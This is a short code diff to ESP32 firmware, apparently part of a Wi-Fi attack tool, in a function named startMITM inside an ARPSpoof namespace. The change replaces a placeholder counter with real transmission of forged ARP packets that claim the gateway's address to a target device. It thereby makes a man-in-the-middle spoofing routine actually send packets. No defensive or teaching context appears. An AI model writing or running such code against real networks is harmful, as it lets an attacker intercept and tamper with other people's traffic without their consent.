@@ -3,6 +3,7 @@
 #include <WiFi.h>
 #include <lwip/inet.h>
 #include "mac_utils.h"
+#include <esp_wifi.h>
 
 namespace ARPSpoof {
 
@@ -69,7 +70,13 @@ SpoofResult startMITM(const String &targetIP, const String &gatewayIP, uint16_t 
         pkt.senderIP = gateway;
         pkt.targetIP = target;
 
-        packetsSent++;
+        // Send ARP packet via WiFi raw frame transmission
+        esp_err_t txResult = esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t*)&pkt, sizeof(pkt), false);
+        if (txResult == ESP_OK) {
+            packetsSent++;
+        } else {
+            Serial.print("⚠ ARP TX error(0x" + String(txResult, 16) + ") ");
+        }
         delay(100);
     }
 
